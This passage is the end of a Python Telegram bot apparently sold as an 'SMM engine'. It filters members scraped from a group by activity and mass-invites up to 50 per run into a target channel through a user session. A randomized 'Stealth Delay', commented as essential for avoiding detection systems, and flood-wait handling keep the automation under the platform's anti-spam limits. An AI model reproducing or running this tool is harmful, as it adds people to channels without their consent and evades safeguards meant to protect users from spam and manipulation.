            elif isinstance(status, (tl_types.UserStatusLastWeek, tl_types.UserStatusLastMonth, tl_types.UserStatusOffline)):
                inactive_segment.append(p)

        # Determine which list to use based on the saved state
        chosen_list = active_segment if "ACTIVE" in user_data['bot_state'] else inactive_segment
        final_targets = chosen_list[:50] # Hard safety cap of 50 per session run
        total_count = len(final_targets)

        if total_count == 0:
            await db.update_state(user_data['user_id'], "IDLE")
            return await bot.edit_message_text("❌ <b>No targets found:</b> No users matched your specific filters in this group.", chat_id, status_msg.message_id)

        # --- STAGE 2: EXECUTION ---
        await bot.edit_message_text(
            f"✅ <b>Filter Complete:</b> Found {len(chosen_list)} potential users.\n"
            f"⚡ <b>Engine:</b> Now transferring the first {total_count} members...", 
            chat_id, status_msg.message_id, parse_mode="HTML"
        )

        success, fail = 0, 0
        for index, user in enumerate(final_targets):
            try:
                # Execution of the invitation request
                await client(functions.channels.InviteToChannelRequest(target_ent, [user.id]))
                success += 1
            except errors.FloodWaitError as e:
                # Anti-Flood Protocol
                await bot.send_message(chat_id, f"🛡️ <b>Flood Protocol:</b> Sleeping for {e.seconds}s to prevent account ban.")
                await asyncio.sleep(e.seconds)
            except errors.UserPrivacyRestrictedError:
                # Privacy skips don't count as 'crashes'
                fail += 1
            except Exception as e:
                logger.error(f"Invite failure: {e}")
                fail += 1

            # --- STAGE 3: UI REFRESH ---
            if (index + 1) % 5 == 0 or (index + 1) == total_count:
                bar = generate_progress_bar(index + 1, total_count)
                progress_text = (
                    f"🚀 <b>Vinzy SMM Engine V8.5</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Progress:</b> {index + 1}/{total_count}\n"
                    f"{bar}\n\n"
                    f"✨ <b>Successful:</b> <code>{success}</code>\n"
                    f"❌ <b>Restricted:</b> <code>{fail}</code>\n"
                    f"🛡️ <b>Safety Delay:</b> Active"
                )
                await bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="HTML")
            
            # Stealth Delay: Essential for avoiding the 2026 AI detection systems
            await asyncio.sleep(random.randint(40, 60))

        # --- STAGE 4: FINALIZATION ---
        final_report = (
            f"🏁 <b>Mission Accomplished!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Total Added: <b>{success}</b>\n"
            f"⚠️ Privacy Skips: <b>{fail}</b>\n\n"
            f"Your worker session is now resting. {VINZY_ASCII}"
        )
        await bot.send_message(chat_id, final_report, parse_mode="HTML")
        await db.update_state(user_data['user_id'], "IDLE")

    except Exception as fatal_err:
        logger.critical(f"FATAL WORKER ERROR: {fatal_err}")
        await bot.send_message(chat_id, f"🚨 <b>Critical Engine Failure:</b>\n<code>{str(fatal_err)}</code>")
        await db.update_state(user_data['user_id'], "IDLE")
    finally:
        # Always clean up the connection to save RAM on Koyeb
        await client.disconnect()

# --- 9. APPLICATION RUNTIME ---

async def main():
    print("="*50)
    print("VINZY SMM V8.2 - ENTERPRISE ONLINE")
    print(f"BOOT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("DATABASE: NEONDB ASYNC POOL CONNECTED")
    print("="*50)
    
    # Initialize DB before polling
    await db.connect()
    
    # Start bot with deep timeout protection
    while True:
        try:
            await bot.infinity_polling(skip_pending=True, timeout=90)
        except ApiTelegramException as e:
            if e.error_code == 409:
                logger.warning("Conflict error. Waiting to retry...")
                await asyncio.sleep(10)
        except Exception as e:
            logger.error(f"Polling crash: {e}")
            await asyncio.sleep(15)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Shutting down Vinzy Engine gracefully.")
